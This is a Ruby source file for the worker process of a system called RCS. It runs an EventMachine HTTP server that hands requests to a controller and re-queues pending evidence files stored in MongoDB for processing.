#
# The main file of the worker
#

# relatives
require_relative 'audio_processor'
require_relative 'evidence/call'
require_relative 'parser'

# from RCS::DB
if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
end

# from RCS::Common
require 'rcs-common/trace'
#require 'rcs-common/evidence'
#require 'rcs-common/evidence_manager'
require 'rcs-common/fixnum'

# form System
require 'digest/md5'
require 'net/http'
require 'optparse'

require 'eventmachine'
require 'evma_httpserver'

module RCS
module Worker

Thread.abort_on_exception=true

module HTTPHandler
  include RCS::Tracer
  include EM::HttpServer
  include Parser
  
  attr_reader :peer
  attr_reader :peer_port
  
  def post_init
    # don't forget to call super here !
    super

    # timeout on the socket
    set_comm_inactivity_timeout 30

    @request_time = Time.now

    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings

    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024

    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    @network_peer = @peer
    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
  end

  def ssl_handshake_completed
    trace :debug, "[#{@peer}] SSL Handshake completed successfully (#{Time.now - @request_time})"
  end

  def closed?
    @closed
  end

  def ssl_verify_peer(cert)
    #TODO: check if the client cert is valid
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
    @closed = true
  end

  def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    #trace :info, "[#{@peer}] Incoming HTTP Connection"
    size = @http_post_content.nil? ? 0 : @http_post_content.bytesize
    trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"

    # get it again since if the connection is keep-alived we need a fresh timing for each
    # request and not the total from the beginning of the connection
    @request_time = Time.now

    responder = nil

    # Block which fulfills the request
    operation = proc do

      trace :debug, "[#{@peer}] QUE: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time})" if RCS::DB::Config.instance.global['PERF']

      generation_time = Time.now

      begin
        # parse all the request params
        request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_cookie, @http_content_type, @http_post_content

        request[:peer] = @peer
        request[:headers] = @http_headers.split("\x00")

        # get the correct controller
        controller = WorkerController.new
        controller.request = request
        
        # do the dirty job :)
        responder = controller.act!
        
        # create the response object to be used in the EM::defer callback

        reply = responder.prepare_response(self, request)

        # keep the size of the reply to be used in the closing method
        @response_size = reply.content ? reply.content.bytesize : 0
        trace :debug, "[#{@peer}] GEN: [#{request[:method]}] #{request[:uri]} #{request[:query]} (#{Time.now - generation_time}) #{@response_size.to_s_bytes}" if RCS::DB::Config.instance.global['PERF']

        reply
      rescue Exception => e
        trace :error, e.message
        trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")

        # TODO: SERVER ERROR
        responder = RESTResponse.new(500, e.message)
        reply = responder.prepare_response(self, request)
        reply
      end

    end
    
    # Callback block to execute once the request is fulfilled
    response = proc do |reply|
    	reply.send_response

       # keep the size of the reply to be used in the closing method
      @response_size = reply.headers['Content-length'] || 0
    end
    
    # Let the thread pool handle request
    EM.defer(operation, response)
  end
  
end

class Worker
  include Tracer
  
  attr_reader :type, :audio_processor

=begin
  def resume
    instances = EvidenceManager.instance.instances
    instances.each do |instance|
      trace :info, "Resuming remaining evidences for #{instance}"
      ids = EvidenceManager.instance.evidence_ids instance
      ids.each {|id| QueueManager.instance.queue(instance, id)}
    end
  end
=end
  
  def setup(port = 5150)
    
    # main EventMachine loop
    begin
      
      # process all the pending evidence in the repository
      #resume
      
      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll
        
        # set the thread pool size
        EM.threadpool_size = 50
        
        resume_pending_evidences

        EM::start_server("0.0.0.0", port, HTTPHandler)
        trace :info, "listening on port #{port}"
        
        trace :info, "Worker '#{RCS::DB::Config.instance.global['SHARD']}' ready!"
      end
    rescue Interrupt
      trace :info, "User asked to exit. Bye bye!"
      return 0
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor'
        trace :fatal, "Cannot bind port #{RCS::DB::Config.instance.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end
    
  end

  def resume_pending_evidences
    begin
      db = Mongoid.database
      evidences = db.collection('grid.evidence.files').find({metadata: {shard: RCS::DB::Config.instance.global['SHARD']}})
      evidences.each do |ev|
        ident, instance = ev['filename'].split(":")
        QueueManager.instance.queue instance, ident, ev['_id'].to_s
      end
    rescue Exception => e
      trace :error, "Cannot process pending evidences: #{e.message}"
    end
  end

end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options) #, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml'
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting a RCS Worker #{version}..."
      
      # config file parsing
      return 1 unless RCS::DB::Config.instance.load_from_file
      
      # connect to MongoDB
      until RCS::DB::DB.instance.connect
        trace :warn, "Cannot connect to MongoDB, retrying..."
        sleep 5
      end
      
      Worker.new.setup RCS::DB::Config.instance.global['WORKER_PORT']
    
    rescue Interrupt
      trace :info, "User asked to exit. Bye bye!"
      return 0
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run argv
  end
end

end # Worker::
end # RCS::